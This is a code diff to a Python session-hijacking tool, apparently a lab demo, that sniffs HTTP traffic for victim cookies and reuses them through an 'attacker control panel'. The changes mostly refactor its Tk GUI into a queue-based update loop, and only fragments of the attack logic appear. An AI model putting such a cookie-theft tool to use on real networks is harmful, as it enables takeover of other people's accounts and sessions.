@@ -12,6 +12,7 @@ import threading
 import re
 import os
 import requests
+import queue
 from scapy.all import sniff, TCP, Raw
 from datetime import datetime
 
@@ -49,13 +50,14 @@ class HTTPSessionHijacker(threading.Thread):
         # prevent spam on same cookie
         self._last_seen_cookie = None
 
+        self._gui_queue = queue.Queue()
         self.gui = None
         if GUI_AVAILABLE:
             self._setup_gui()
         else:
             print("[INFO] Running in headless mode (no GUI).")
 
-    # ---------------- GUI (optional) ----------------
+    # GUI mode
 
     def _setup_gui(self):
         self.gui = Tk()
@@ -74,20 +76,38 @@ class HTTPSessionHijacker(threading.Thread):
         self.log_box = ttk.Label(self.gui, text="", wraplength=480, justify="left")
         self.log_box.pack(pady=8)
 
-        threading.Thread(target=self.gui.mainloop, daemon=True).start()
+        # GUI polling loop
+        self.gui.after(100, self._process_gui_queue)
+
 
     def _update_status(self, message, progress=None):
         now = datetime.now().strftime("%H:%M:%S")
         print(f"[HIJACK] [{now}] {message}")
 
         if self.gui:
-            self.status_var.set(message)
-            self.log_box.config(text=self.log_box.cget("text") + f"\n• {message}")
-            if progress is not None:
-                self.progress["value"] = progress
+            self._gui_queue.put((message, progress))
 
-    # ---------------- Session helpers ----------------
+    def _process_gui_queue(self):
+        try:
+            while True:
+                message, progress = self._gui_queue.get_nowait()
 
+                self.status_var.set(message)
+                self.log_box.config(
+                    text=self.log_box.cget("text") + f"\n• {message}"
+                )
+                if progress is not None:
+                    self.progress["value"] = progress
+
+        except queue.Empty:
+            pass
+
+        if self.gui:
+            self.gui.after(100, self._process_gui_queue)
+
+
+
+    # Session Helpers
     def _ensure_session(self) -> requests.Session:
         """
         Create attacker session (requests.Session) once, but allow hot-swapping cookie.
@@ -132,8 +152,7 @@ class HTTPSessionHijacker(threading.Thread):
 
         self._update_status(f"[!] Attacker session cleared ({reason}). Awaiting new victim session cookie...")
 
-    # ---------------- HTTP helpers ----------------
-
+    # HTTP Helpers
     def _get(self, path: str, timeout=5) -> requests.Response:
         url = f"http://{self.target_ip}{path}"
         return self._ensure_session().get(url, timeout=timeout, allow_redirects=True)
@@ -145,8 +164,7 @@ class HTTPSessionHijacker(threading.Thread):
         url = f"http://{self.target_ip}{path}"
         return self._ensure_session().post(url, data=data, timeout=timeout, allow_redirects=False)
 
-    # ---------------- Attack logic ----------------
-
+    # Attack Logic
     def _packet_callback(self, packet):
         if self._stop_event.is_set():
             return
@@ -283,8 +301,7 @@ class HTTPSessionHijacker(threading.Thread):
         self._update_status("Next: Attacker Control Panel lets you act as victim manually.")
         self._update_status("-" * 72)
 
-    # ---------------- Attacker Control Panel (TEXT-BASED) ----------------
-
+    # Attacker Control Panel
     def _attacker_control_panel(self):
         self._update_status("Attacker Control Panel ready (text-based).", 100)
         self._update_status("Victim browser is NOT touched. These actions are attacker-only.")
@@ -373,11 +390,10 @@ class HTTPSessionHijacker(threading.Thread):
             except Exception as e:
                 self._update_status(f"Control panel error: {e}")
 
-    # ---------------- Thread ----------------
-
+    # Thread
     def run(self):
         self._update_status("=" * 72)
-        self._update_status("HTTP SESSION HIJACKING (DEMO) — Evidence-first, headless-safe")
+        self._update_status("HTTP SESSION HIJACKING (DEMO)")
         self._update_status(f" Interface      : {self.interface}")
         self._update_status(f" Victim IP       : {self.victim_ip}")
         self._update_status(f" Target Domain   : {self.target_domain}")
